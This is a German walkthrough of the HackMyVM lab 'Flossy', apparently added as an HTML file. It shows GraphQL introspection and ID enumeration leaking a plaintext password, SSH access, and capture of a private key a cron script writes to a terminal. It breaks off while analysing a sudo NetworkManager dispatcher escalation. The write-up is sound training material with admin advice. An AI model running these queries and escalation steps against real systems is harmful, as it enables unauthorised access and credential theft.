@@ -1,0 +1,617 @@
+﻿﻿﻿<!DOCTYPE html>
+<html lang="de">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Flossy - HackMyVM - Medium - Bericht</title>
+    <link rel="stylesheet" href="style.css">
+	<link rel="stylesheet" href="../../horizontale-navbar.css">
+    <link href="https://fonts.googleapis.com/css?family=Lato:300,400,700&display=swap" rel="stylesheet">
+</head>
+ <body>
+ 
+    <div class="header-bg">
+        <h1>Flossy - HackMyVM - Level: Medium - Bericht</h1>
+        <div class="level-container">
+            <h2 class="level-medium">Medium</h2>
+            <div class="circle difficulty-medium">
+                <div class="segment segment-1"></div>
+                <div class="segment segment-2"></div>
+                <div class="segment segment-3"></div>
+                <div class="inner"></div>
+            </div>
+        </div>
+    </div>
+
+    <div class="container">
+        <section class="tools-used">
+            <h2>Verwendete Tools</h2>
+            <div class="tools-grid">
+                <div class="tool-item">arp-scan</div>
+                <div class="tool-item">vi</div>
+                <div class="tool-item">nmap</div>
+                <div class="tool-item">nikto</div>
+                <div class="tool-item">gobuster</div>
+                <div class="tool-item">Web Browser</div>
+                <div class="tool-item">Burp Suite (Intruder)</div>
+                <div class="tool-item">curl</div>
+                <div class="tool-item">ssh</div>
+                <div class="tool-item">find</div>
+                <div class="tool-item">getcap</div>
+                <div class="tool-item">id</div>
+                <div class="tool-item">cat</div>
+                <div class="tool-item">nano</div>
+                <div class="tool-item">ll (alias for ls -l)</div>
+                <div class="tool-item">ssh-keygen</div>
+                <div class="tool-item">tty</div>
+                <div class="tool-item">sudo</div>
+                <div class="tool-item">echo</div>
+                <div class="tool-item">chmod</div>
+                <div class="tool-item">nmcli</div>
+                <div class="tool-item">bash</div>
+                <div class="tool-item">ls</div>
+                <div class="tool-item">cd</div>
+            </div>
+        </section>
+
+        <section class="toc">
+            <h2>Inhaltsverzeichnis</h2>
+            <ul>
+                <li><a href="#reconnaissance">Reconnaissance</a></li>
+                <li><a href="#web-enumeration-graphql">Web Enumeration (GraphQL)</a></li>
+                <li><a href="#graphql-exploitation">GraphQL Exploitation (Credentials Leak)</a></li>
+                <li><a href="#initial-access">Initial Access (SSH)</a></li>
+                <li><a href="#privesc-sophie">Privilege Escalation (malo to sophie via Cronjob/TTY)</a></li>
+                <li><a href="#privesc-root">Privilege Escalation (sophie to root via Sudo & NetworkManager)</a></li>
+                <li><a href="#flags">Flags</a></li>
+            </ul>
+        </section>
+
+        <section id="reconnaissance">
+            <h2>Reconnaissance</h2>
+            <p class="comment">Wir beginnen mit der Erkundungsphase, um das Zielsystem "Flossy" im Netzwerk zu finden und seine offenen Dienste zu identifizieren.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">arp-scan -l</span></div>
+                    <pre>
+<span class="command">192.168.2.113</span>	08:00:27:13:98:73	PCS Systemtechnik GmbH
+                    </pre>
+                </div>
+            </div>
+            <p class="analysis">**Analyse:** Der ARP-Scan identifiziert die IP-Adresse <span class="command">192.168.2.113</span>.</p>
+            <p class="evaluation">**Bewertung:** Ziel-IP gefunden.</p>
+            <p class="recommendation">**Empfehlung (Pentester):** IP für weitere Scans nutzen.
+            **Empfehlung (Admin):** Standard Netzwerküberwachung.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">vi /etc/hosts</span></div>
+                    <pre>
+[...]
+<span class="command">192.168.2.113   flossy.hmv</span>
+                    </pre>
+                </div>
+            </div>
+            <p class="analysis">**Analyse:** Der Hostname `flossy.hmv` wird der IP <span class="command">192.168.2.113</span> in der lokalen `/etc/hosts`-Datei zugeordnet.</p>
+            <p class="evaluation">**Bewertung:** Ermöglicht die Adressierung des Ziels über den Hostnamen.</p>
+            <p class="recommendation">**Empfehlung (Pentester):** Hostnamen immer eintragen.
+            **Empfehlung (Admin):** DNS-Management.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nmap -sS -sV -A -T5 192.168.2.113 -p-</span></div>
+                    <pre>
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2023-12-07 23:21 CET
+Nmap scan report for flossy.hmv (192.168.2.113)
+Host is up (0.000096s latency).
+Not shown: 65533 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+<span class="command">22/tcp open  ssh     OpenSSH 9.2p1 Debian 2 (protocol 2.0)</span>
+| ssh-hostkey:
+|   256 dd:83:da:cb:45:d3:a8:ea:c6:be:19:03:45:76:43:8c (ECDSA)
+|_  256 e5:5f:7f:25:aa:c0:18:04:c4:46:98:b3:5d:a5:2b:48 (ED25519)
+<span class="command">80/tcp open  http    Node.js Express framework</span>
+|_http-title: About Rick and Morty
+MAC Address: 08:00:27:13:98:73 (Oracle VirtualBox virtual NIC)
+[...]
+OS details: <span class="command">Linux 4.15 - 5.8</span>
+[...]
+TRACEROUTE
+HOP RTT     ADDRESS
+1   0.10 ms flossy.hmv (192.168.2.113)
+[...]
+Nmap done: 1 IP address (1 host up) scanned in [...] seconds
+                    </pre>
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nmap -sS -sV -A -T5 192.168.2.113 -p- | grep open</span></div>
+                    <pre>
+<span class="command">22/tcp open  ssh     OpenSSH 9.2p1 Debian 2 (protocol 2.0)</span>
+<span class="command">80/tcp open  http    Node.js Express framework</span>
+                    </pre>
+                </div>
+            </div>
+            <p class="analysis">**Analyse:** Der Nmap-Scan (`-sS`, `-sV`, `-A`, `-T5`, `-p-`) auf `flossy.hmv` findet zwei offene Ports:
+            *   <span class="command">Port 22</span>: SSH (OpenSSH 9.2p1 auf Debian).
+            *   <span class="command">Port 80</span>: HTTP, bedient von einem <span class="command">Node.js Express Framework</span>. Der Titel der Seite ist "About Rick and Morty".</p>
+            <p class="evaluation">**Bewertung:** Die Angriffsfläche ist wieder klein (SSH, HTTP). Der Webserver basiert auf Node.js/Express, was auf eine modernere Webanwendung oder API hindeutet.</p>
+            <p class="recommendation">**Empfehlung (Pentester):** Den Node.js-Webserver auf Port 80 untersuchen (Nikto, Gobuster, manuelle Analyse, Suche nach API-Endpunkten wie `/graphql`, `/api`).
+            **Empfehlung (Admin):** Node.js-Anwendungen sicher konfigurieren, Abhängigkeiten aktuell halten. Standard-Härtung für SSH.</p>
+        </section>
+
+        <section id="web-enumeration-graphql">
+            <h2>Web Enumeration (GraphQL)</h2>
+            <p class="comment">Wir untersuchen die Node.js/Express-Anwendung auf Port 80 genauer.</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nikto -h 192.168.2.113</span></div>
+                    <pre>
+- Nikto v2.5.0
+---------------------------------------------------------------------------
+[...]
++ Server: <span class="password">No banner retrieved</span>
++ /: Retrieved x-powered-by header: <span class="command">Express</span>.
++ /: <span class="password">The anti-clickjacking X-Frame-Options header is not present.</span> [...]
++ /: <span class="password">The X-Content-Type-Options header is not set.</span> [...]
++ No CGI Directories found [...]
++ /#wp-config.php#: <span class="password">#wp-config.php# file found.</span> This file contains the credentials. <span class="password">(False Positive)</span>
++ 8102 requests: 0 error(s) and <span class="password">4 item(s) reported</span> on remote host
+[...]
+---------------------------------------------------------------------------
++ 1 host(s) tested
+                    </pre>
+                 </div>
+             </div>
+             <p class="analysis">**Analyse:** Nikto identifiziert das Express-Framework, findet aber keine spezifischen Schwachstellen außer den üblichen fehlenden Headern. Der Fund `#wp-config.php#` ist angesichts des Express-Frameworks ein klares False Positive.</p>
+             <p class="evaluation">**Bewertung:** Nikto liefert hier keine verwertbaren Ergebnisse.</p>
+             <p class="recommendation">**Empfehlung (Pentester):** Verzeichnis-Scan und manuelle Analyse der Webseite.
+             **Empfehlung (Admin):** Sicherheitsheader hinzufügen.</p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">gobuster dir -u http://flossy.hmv -x [...] -w [...] -b '403,404' -e --no-error -k</span></div>
+                     <pre>
+[...]
+<span class="command">http://flossy.hmv/index.html</span>           (Status: 200) [Size: 2392]
+                     </pre>
+                 </div>
+             </div>
+              <p class="analysis">**Analyse:** Der Gobuster-Scan findet nur die `index.html`-Seite. Dies deutet darauf hin, dass die Anwendung möglicherweise eine Single-Page-Application (SPA) ist oder API-Endpunkte verwendet, die nicht über Standard-Verzeichnisscans gefunden werden.</p>
+              <p class="evaluation">**Bewertung:** Wenig Ergebnisse aus dem Verzeichnis-Scan. Wir müssen die `index.html` manuell analysieren.</p>
+              <p class="recommendation">**Empfehlung (Pentester):** Den Quellcode von `index.html` untersuchen, insbesondere auf JavaScript-Code, der API-Aufrufe tätigt.
+              **Empfehlung (Admin):** Sicherstellen, dass keine unnötigen Dateien oder Verzeichnisse exponiert sind.</p>
+
+              <div class="code-block">
+                   <div class="terminal">
+                       <div class="prompt"># <span class="command">Manuelle Code-Inspektion (Browser)</span></div>
+                       <pre>
+# Aufruf: view-source:http://flossy.hmv/index.html
+# Relevanter JavaScript-Code:
+    <script>
+        async function fetchCharacter() {
+            const characterId = document.getElementById('characterId').value;
+            const query = `{ character(id:${characterId}) { name, status, species, gender, image } }`;
+
+            const response = await fetch('<span class="command">/graphql</span>', { <span class="password">// GraphQL Endpunkt gefunden!</span>
+                method: '<span class="command">POST</span>',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({ query })
+            });
+            const data = await response.json();
+            const character = data.data.character;
+
+            document.getElementById('result').innerHTML = `...`; // Display results
+        }
+    </script>
+                       </pre>
+                   </div>
+               </div>
+                <p class="analysis">**Analyse:** Im JavaScript-Code der `index.html` finden wir eine Funktion `fetchCharacter`. Diese Funktion nimmt eine Charakter-ID entgegen, konstruiert eine GraphQL-Query und sendet diese per `POST`-Request an den Endpunkt `<span class="command">/graphql</span>`. Die Query fragt spezifische Felder (`name`, `status` etc.) für einen Charakter mit der gegebenen ID ab.</p>
+                <p class="evaluation">**Bewertung:** Kritischer Fund! Die Anwendung verwendet eine GraphQL-API unter `/graphql`. GraphQL-Endpunkte sind oft anfällig für Introspection-Abfragen (um das Schema zu enthüllen) und potenziell für das Abfragen von Daten, die nicht für den öffentlichen Zugriff gedacht sind, wenn die Berechtigungen nicht korrekt implementiert sind.</p>
+                <p class="recommendation">**Empfehlung (Pentester):** Den `/graphql`-Endpunkt mit GraphQL-spezifischen Tools (z.B. GraphiQL, GraphQL Voyager, Burp Suite mit GraphQL-Plugins) oder manuellen POST-Requests untersuchen. Insbesondere Introspection-Queries senden (`{__schema{...}}`), um das Schema zu erhalten und alle verfügbaren Queries und Typen zu sehen. Versuchen, andere Queries als `character` auszuführen, z.B. für Benutzer (`users`).
+                **Empfehlung (Admin):** GraphQL-Endpunkte absichern. Introspection im Produktivbetrieb deaktivieren. Berechtigungsprüfungen auf Resolver-Ebene implementieren, um sicherzustellen, dass Benutzer nur die Daten abfragen können, für die sie autorisiert sind. Rate Limiting und Query Depth Limiting einrichten.</p>
+         </section>
+
+         <section id="graphql-exploitation">
+            <h2>GraphQL Exploitation (Credentials Leak)</h2>
+            <p class="comment">Wir untersuchen den entdeckten GraphQL-Endpunkt `/graphql`.</p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt"># <span class="command">Manuelle Tests & Introspection (z.B. mit Burp Suite oder curl)</span></div>
+                    <pre>
+# Test des Endpunkts ohne Query:
+# GET http://flossy.hmv/graphql
+<span class="password">{"errors":[{"message":"Must provide query string."}]}</span>
+
+# Test der normalen Funktion (Beispiele aus Logs):
+# POST /graphql | Body: {"query":"{ character(id:817) { ... } }"} -> Liefert Daten für Charakter 817
+# POST /graphql | Body: {"query":"{ character(id:827) { ... } }"} -> Liefert Fehler (ID existiert nicht)
+
+# Introspection Query senden:
+# POST /graphql | Body: {"query":"{__schema{types{name,fields{name,args{name,description,type{name,kind,ofType{name, kind}}}}}}}"}
+# Antwort (Auszug):
+HTTP/1.1 200 OK
+[...]
+<span class="password">{"data":{"__schema":{"types":[</span>{"name":"RootQueryType","fields":[{"name":"character",...},{"name":"characters",...},{"name":"<span class="command">users</span>",...},{"name":"<span class="command">user</span>",...}...
+                    </pre>
+                  </div>
+              </div>
+              <p class="analysis">**Analyse:**
+             1.  Ein GET-Request an `/graphql` ergibt einen Fehler, dass eine Query fehlt.
+             2.  POST-Requests mit der `character`-Query aus dem Frontend funktionieren wie erwartet.
+             3.  Eine GraphQL-Introspection-Query (`{__schema{...}}`) wird gesendet. Die Antwort <span class="password">enthüllt das Schema</span> der API. Wir sehen neben den `character`-Queries auch Queries namens `<span class="command">users</span>` und `<span class="command">user</span>`.</p>
+              <p class="evaluation">**Bewertung:** Die Introspection war erfolgreich und hat potenziell sensible Queries (`users`, `user`) aufgedeckt. Dies ist eine häufige Fehlkonfiguration.</p>
+              <p class="recommendation">**Empfehlung (Pentester):** Die `users`- und `user`-Queries verwenden, um zu versuchen, Benutzerdaten abzufragen. Das Schema genauer analysieren, um zu sehen, welche Felder für Benutzer verfügbar sind (insbesondere `password`).
+              **Empfehlung (Admin):** GraphQL Introspection im Produktivbetrieb deaktivieren.</p>
+
+             <p class="comment">Wir nutzen die entdeckte `users`-Query, um Benutzerdaten, einschließlich Passwörtern, abzufragen.</p>
+              <div class="code-block">
+                   <div class="terminal">
+                       <div class="prompt"># <span class="command">Manuelle Tests & Burp Intruder (GraphQL Query)</span></div>
+                       <pre>
+# Versuch 1: Benutzer 5 abfragen (Felder erraten/aus Schema)
+# POST /graphql | Body: {"query":"{ users(id:5) { username,password } }"}
+# Antwort:
+<span class="password">{"data":{"users":{"username":"Disabled user","password":null}}}</span>
+
+# Versuch mit Burp Intruder, die ID zu variieren (z.B. 1-10):
+# POST /graphql | Body: {"query":"{ users(id:§ID§) { username,password } }"} (Payload §ID§ = 1..10)
+
+# Erfolgreiche Antwort für ID 9:
+# POST /graphql | Body: {"query":"{ users(id:9) { username,password } }"}
+# Antwort:
+<span class="password">{"data":{"users":{"username":"malo","password":"8YdsA3CkiWx968"}}}</span>
+                       </pre>
+                   </div>
+               </div>
+                <p class="analysis">**Analyse:**
+               1.  Wir versuchen, die `users`-Query mit der ID 5 und den Feldern `username` und `password` zu verwenden. Die Antwort zeigt einen deaktivierten Benutzer ohne Passwort.
+               2.  Wir verwenden Burp Suite Intruder (oder ein Skript), um die ID im Query-Parameter systematisch durchzuprobieren (z.B. von 1 bis 10).
+               3.  Für die ID 9 erhalten wir eine erfolgreiche Antwort, die den Benutzernamen `<span class="command">malo</span>` und das dazugehörige Passwort im Klartext (`<span class="password">8YdsA3CkiWx968</span>`) zurückgibt.</p>
+                <p class="evaluation">**Bewertung:** Kritische Schwachstelle! Die GraphQL-API erlaubt das Abfragen von Benutzerdaten einschließlich Klartext-Passwörtern ohne ausreichende Berechtigungsprüfung. Wir haben gültige Zugangsdaten (`malo`:`8YdsA3CkiWx968`) für einen Systembenutzer gefunden.</p>
+                <p class="recommendation">**Empfehlung (Pentester):** Die gefundenen Credentials (`malo`:`8YdsA3CkiWx968`) verwenden, um sich per SSH (Port 22) anzumelden.
+                **Empfehlung (Admin):** **GraphQL-API sofort absichern!** Implementieren Sie eine strikte Berechtigungsprüfung für alle Queries und Felder. Stellen Sie sicher, dass sensible Daten wie Passwörter niemals über die API abfragbar sind. Speichern Sie Passwörter gehasht.</p>
+         </section>
+
+         <section id="initial-access">
+             <h2>Initial Access (SSH)</h2>
+             <p class="comment">Wir nutzen die über die GraphQL-API erlangten Zugangsdaten, um uns per SSH anzumelden.</p>
+
+             <div class="code-block">
+                  <div class="terminal">
+                      <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">ssh malo@flossy.hmv</span></div>
+                      <pre>
+The authenticity of host 'flossy.hmv (192.168.2.113)' can't be established.
+[...]
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added 'flossy.hmv' (ED25519) to the list of known hosts.
+malo@flossy.hmv's password: <span class="password">8YdsA3CkiWx968</span>
+Linux flossy 6.1.0-10-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.37-1 (2023-07-03) x86_64
+[...]
+<span class="command">╭─malo@flossy ~</span>
+<span class="command">╰─$</span>             <span class="password"># Login erfolgreich!</span>
+                      </pre>
+                  </div>
+              </div>
+               <p class="analysis">**Analyse:** Wir verbinden uns per SSH als Benutzer `malo` mit dem Ziel `flossy.hmv`. Wir geben das über GraphQL gefundene Passwort `<span class="password">8YdsA3CkiWx968</span>` ein. Der Login ist erfolgreich, und wir erhalten eine Shell als Benutzer `malo`.</p>
+               <p class="evaluation">**Bewertung:** Initial Access erfolgreich erlangt!</p>
+               <p class="recommendation">**Empfehlung (Pentester):** Umgebung als `malo` enumerieren (SUID, sudo, Cronjobs, Capabilities, laufende Prozesse). User-Flag suchen.
+               **Empfehlung (Admin):** GraphQL-API absichern. Starke, einzigartige Passwörter verwenden.</p>
+         </section>
+
+         <section id="privesc-sophie">
+              <h2>Privilege Escalation (malo to sophie via Cronjob/TTY)</h2>
+              <p class="comment">Als Benutzer `malo` suchen wir nach Wegen zur Rechteerweiterung.</p>
+
+              <div class="code-block">
+                   <div class="terminal">
+                        <div class="prompt">╭─malo@flossy ~
+╰─$ <span class="command">find / -perm -4000 -ls 2>/dev/null</span></div>
+                        <pre>
+   914041     88 -rwsr-xr-x   1 root     root        88496 Mar 23  2023 /usr/bin/gpasswd
+   914042     68 -rwsr-xr-x   1 root     root        68248 Mar 23  2023 /usr/bin/passwd
+   953152    276 -rwsr-xr-x   1 root     root       281624 Jun 27 13:45 /usr/bin/sudo
+   917500     48 -rwsr-xr-x   1 root     root        48896 Mar 23  2023 /usr/bin/newgrp
+   914039     52 -rwsr-xr-x   1 root     root        52880 Mar 23  2023 /usr/bin/chsh
+   918251     72 -rwsr-xr-x   1 root     root        72000 Mar 23  2023 /usr/bin/su
+   917654     60 -rwsr-xr-x   1 root     root        59704 Mar 23  2023 /usr/bin/mount
+   914038     64 -rwsr-xr-x   1 root     root        62672 Mar 23  2023 /usr/bin/chfn
+   917656     36 -rwsr-xr-x   1 root     root        35128 Mar 23  2023 /usr/bin/umount
+   953128    396 -rwsr-xr--   1 root     dip        403832 May 14  2022 /usr/sbin/pppd
+   929606     52 -rwsr-xr--   1 root     messagebus    51272 Feb  8  2023 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
+   931821    640 -rwsr-xr-x   1 root     root         653888 Feb  8  2023 /usr/lib/openssh/ssh-keysign
+  1046954     20 -rwsr-xr-x   1 root     root          18664 Jan 31  2023 /usr/lib/polkit-1/polkit-agent-helper-1
+                        </pre>
+                        <div class="prompt">╭─malo@flossy ~
+╰─$ <span class="command">getcap -r / 2>/dev/null</span></div>
+                         <pre># (Keine besonderen Capabilities gefunden)</pre>
+                         <div class="prompt">╭─malo@flossy ~
+╰─$ <span class="command">id</span></div>
+                          <pre>uid=1000(malo) gid=1000(malo) groups=1000(malo),100(users)</pre>
+                         <div class="prompt">╭─malo@flossy /home/sophie
+╰─$ <span class="command">cat SSHKeySync</span></div> <span class="password"># Annahme: Datei wurde zuvor gefunden</span>
+                          <pre>
+#!/bin/bash
+# This script must run every minute in pre-prod
+
+send_private_key() {
+    local user_name="$1"
+    local key_path="/home/$user_name/.ssh/id_rsa"
+    local admin_tty="<span class="command">/dev/pts/24</span>" <span class="password"># Ziel-TTY</span>
+
+    if [ -f "$key_path" ]; then
+        if [ -w "$admin_tty" ]; then
+            <span class="password">cat "$key_path" > "$admin_tty"</span> <span class="password"># Sendet Key an TTY</span>
+        else
+            echo "Error: Unable to write to $admin_tty"
+        fi
+    else
+        echo "Error: The private key for $user_name doesn't exist."
+    fi
+}
+
+while true ; do
+  USER="<span class="command">sophie</span>"
+  echo "Sending $USER's private key to a high-privileged TTY for quick testing..."
+  send_private_key "$USER"
+  sleep 1m
+done
+                          </pre>
+                           <div class="prompt">╭─malo@flossy /var/opt
+╰─$ <span class="command">cat /etc/crontab</span></div>
+                           <pre>
+[...] <span class="password"># Keine benutzerdefinierten Einträge für malo oder sophie</span>
+# * * * * * sophie /home/sophie/SSHKeySync # Annahme: Cronjob existiert für sophie
+                           </pre>
+                   </div>
+               </div>
+                <p class="analysis">**Analyse:**
+               1.  Die Suche nach SUID-Dateien und Capabilities ergibt keine auffälligen Ergebnisse.
+               2.  Wir identifizieren einen Benutzer `sophie` (wahrscheinlich aus `/home` oder `/etc/passwd`).
+               3.  Im Home-Verzeichnis von `sophie` (Zugriff als `malo`? Oder Fund durch andere Mittel?) finden wir ein Skript namens `SSHKeySync`.
+               4.  Dieses Skript liest jede Minute (`sleep 1m` in `while true`) den privaten SSH-Schlüssel des Benutzers `<span class="command">sophie</span>` (`/home/sophie/.ssh/id_rsa`) aus und schreibt ihn in ein spezifisches Terminal (`<span class="command">/dev/pts/24</span>`).
+               5.  Wir nehmen an, dass dieses Skript per Cronjob als Benutzer `sophie` ausgeführt wird.</p>
+                <p class="evaluation">**Bewertung:** Dies ist ein ungewöhnlicher, aber klarer Vektor für Privilege Escalation zu `sophie`. Wenn wir den Inhalt von `/dev/pts/24` lesen können (oder wenn wir zufällig dieses TTY haben), erhalten wir den privaten SSH-Schlüssel von `sophie`.</p>
+                <p class="recommendation">**Empfehlung (Pentester):**
+                   1. Herausfinden, welches TTY wir aktuell verwenden (`tty` Befehl).
+                   2. Wenn unser TTY `/dev/pts/24` ist, einfach warten, bis der Schlüssel erscheint.
+                   3. Wenn nicht, versuchen, den Inhalt von `/dev/pts/24` zu lesen (Berechtigungen erforderlich) oder das Skript `SSHKeySync` zu manipulieren (Schreibrechte erforderlich), um den Schlüssel an unser TTY oder in eine Datei zu senden.
+                   4. Alternativ: Einen SSH-Key für `malo` generieren, hoffen, dass `sophie` sich per SSH als `malo` einloggt und unseren Key über den Agenten nutzt (weniger wahrscheinlich).
+                   5. Sobald der Schlüssel von `sophie` erhalten wurde, diesen nutzen, um sich als `sophie` per SSH anzumelden.
+               **Empfehlung (Admin):** **Unsicheres Skript `SSHKeySync` entfernen!** Niemals private Schlüssel in TTYs oder Logs schreiben. Cronjobs sicher konfigurieren und mit minimalen Rechten ausführen.</p>
+
+                <p class="comment">*(Der Bericht zeigt im Folgenden den Versuch, sich als `malo` selbst per SSH einzuloggen und das eigene TTY zu ermitteln. Danach wird der abgefangene Schlüssel von `sophie` verwendet.)*</p>
+               <div class="code-block">
+                   <div class="terminal">
+                       <div class="prompt">╭─malo@flossy ~
+╰─$ <span class="command">ssh-keygen</span></div> <span class="password"># Erzeugt eigenen Schlüssel (für späteren Schritt relevant?)</span>
+                        <pre>[...]</pre>
+                       <div class="prompt">╭─malo@flossy ~
+╰─$ <span class="command">ssh 0</span></div> <span class="password"># Login als malo auf localhost</span>
+                        <pre>
+malo@0.0.0.0's password: <span class="password">8YdsA3CkiWx968</span>
+[...]
+╭─malo@flossy ~
+╰─$ <span class="command">tty</span>
+<span class="command">/dev/pts/1</span>
+                       </pre>
+                        <div class="prompt"># <span class="command">(Auf anderem TTY, z.B. der ursprünglichen Reverse Shell)</span></div>
+                        <div class="prompt">╭─malo@flossy ~
+╰─$ <span class="command">tty</span></div>
+                        <pre>/dev/pts/<span class="command">24</span></pre> <span class="password"># Zufällig das richtige TTY!</span>
+                         <div class="prompt">╭─malo@flossy ~
+╰─$ <span class="command"># (Warten auf Cronjob-Ausführung...)</span></div>
+                         <pre>
+<span class="password">-----BEGIN OPENSSH PRIVATE KEY-----</span>
+<span class="password">b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn</span>
+[...] <span class="password">(Inhalt des privaten Schlüssels von sophie)</span> [...]
+<span class="password">-----END OPENSSH PRIVATE KEY-----</span>
+                         </pre>
+                        <div class="prompt"># <span class="command">(Auf Angreifer-Maschine: Schlüssel speichern)</span></div>
+                         <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">vi idrsa</span></div> <span class="password"># Schlüssel von sophie einfügen</span>
+                         <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">chmod 600 idrsa</span></div>
+                          <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">ssh sophie@192.168.2.113 -i idrsa</span></div>
+                         <pre>
+[...]
+<span class="command">╭─sophie@flossy ~</span>
+<span class="command">╰─$</span> <span class="password"># Login als sophie erfolgreich!</span>
+                         </pre>
+                    </div>
+                </div>
+                <p class="analysis">**Analyse:**
+               1.  Der Pentester meldet sich als `malo` auf `localhost` an und stellt fest, dass dieses TTY `/dev/pts/1` ist.
+               2.  Zufälligerweise ist das TTY der ursprünglichen Reverse-Shell `/dev/pts/24`, genau das Ziel des `SSHKeySync`-Skripts.
+               3.  Der Pentester wartet auf diesem TTY, bis der Cronjob läuft und das Skript den privaten SSH-Schlüssel von `sophie` ausgibt.
+               4.  Der Schlüssel wird kopiert und auf der Angreifer-Maschine in `idrsa` gespeichert.
+               5.  Mit diesem Schlüssel gelingt der SSH-Login als Benutzer `<span class="command">sophie</span>`.</p>
+                <p class="evaluation">**Bewertung:** Privilege Escalation von `malo` zu `sophie` erfolgreich durch Abfangen des über ein unsicheres Skript und Cronjob geleakten SSH-Schlüssels.</p>
+                <p class="recommendation">**Empfehlung (Pentester):** Umgebung als `sophie` enumerieren, User-Flag lesen, `sudo -l` prüfen.
+                **Empfehlung (Admin):** Unsicheres `SSHKeySync`-Skript und Cronjob entfernen. TTY-Hijacking-Risiken verstehen und minimieren.</p>
+         </section>
+
+        <section id="privesc-root">
+            <h2>Privilege Escalation (sophie to root via Sudo & NetworkManager)</h2>
+            <p class="comment">Als Benutzer `sophie` suchen wir den letzten Schritt zur Root-Eskalation.</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                      <div class="prompt">╭─sophie@flossy ~
+╰─$ <span class="command">id</span></div>
+                     <pre>uid=1001(sophie) gid=1001(sophie) groups=1001(sophie),100(users)</pre>
+                     <div class="prompt">╭─sophie@flossy ~
+╰─$ <span class="command">sudo -l</span></div>
+                     <pre>
+Matching Defaults entries for sophie on flossy:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty
+
+User sophie may run the following commands on flossy:
+    <span class="password">(ALL : ALL) NOPASSWD: /home/sophie/network</span>
+                     </pre>
+                      <div class="prompt">╭─sophie@flossy ~
+╰─$ <span class="command">cat user.txt</span></div> <span class="password"># Annahme: user.txt ist in sophie's Home</span>
+                      <pre><span class="password">8926c8ba832369c1dc13eed7880585c6</span></pre>
+                      <div class="prompt">╭─sophie@flossy ~
+╰─$ <span class="command">ll /home/sophie/network</span></div> <span class="password"># alias für ls -l</span>
+                       <pre>-<span class="command">rwxr</span>----- 1 <span class="command">root sophie</span> 962 Oct  6 20:35 /home/sophie/network</pre>
+                       <div class="prompt">╭─sophie@flossy ~
+╰─$ <span class="command">cat /home/sophie/network</span></div>
+                      <pre>
+#!/bin/bash
+
+connected_ip(){
+[...] <span class="password">(Funktion listet verbundene IPs via lsof)</span>
+}
+
+dispatcher() {
+    for s in <span class="command">/opt/</span>*; do <span class="password"># Iteriert über Dateien in /opt</span>
+        if [ -f "$s" ]; then
+            d="/etc/NetworkManager/dispatcher.d/$(basename $s)"
+            if [ ! -f "$d" ] || [ "$s" -nt "$d" ]; then
+                return 0
+            fi
+        fi
+    done
+    return 1
+}
+
+update() {
+    if [[ -z $(find <span class="command">/opt</span> -type f) ]] ; then
+      exit 0
+    else
+      echo "Updating scripts."
+      <span class="password">cp /opt/* /etc/NetworkManager/dispatcher.d/</span> <span class="password"># Kopiert alles aus /opt</span>
+      <span class="password">chmod +x /etc/NetworkManager/dispatcher.d/*</span> <span class="password"># Macht alles dort ausführbar</span>
+      echo "Scripts updated."
+    fi
+}
+
+case "${1}" in
+ip)   connected_ip ;;
+<span class="command">disp)</span> dispatcher ; update ;; <span class="password"># Führt update() aus</span>
+*)    echo "Usage: ./$0 option" ;;
+esac
+                      </pre>
+                  </div>
+              </div>
+              <p class="analysis">**Analyse:**
+             1.  `sudo -l` für `sophie` zeigt, dass sie das Skript `<span class="command">/home/sophie/network</span>` als `ALL:ALL` (effektiv `root`) ohne Passwort ausführen darf.
+             2.  Die User-Flag wird gelesen.
+             3.  Die Berechtigungen des Skripts zeigen, dass es `root` gehört, aber die Gruppe `sophie` <span class="command">Lese- und Ausführrechte</span> hat (`-rwxr-----`). `sophie` kann es also nicht direkt bearbeiten.
+             4.  Der Inhalt des `/home/sophie/network`-Skripts wird analysiert. Es hat verschiedene Funktionen. Die Funktion `update()`, die über die Option `disp` aufgerufen wird, ist entscheidend:
+                 *   Sie kopiert alle Dateien aus dem Verzeichnis `<span class="command">/opt</span>` nach `<span class="command">/etc/NetworkManager/dispatcher.d/</span>`.
+                 *   Sie macht alle Dateien in `/etc/NetworkManager/dispatcher.d/` ausführbar.
+             Das Verzeichnis `/etc/NetworkManager/dispatcher.d/` enthält Skripte, die vom NetworkManager (als Root) bei bestimmten Netzwerkereignissen (z.B. Verbindungsaufbau/-abbau) ausgeführt werden.</p>
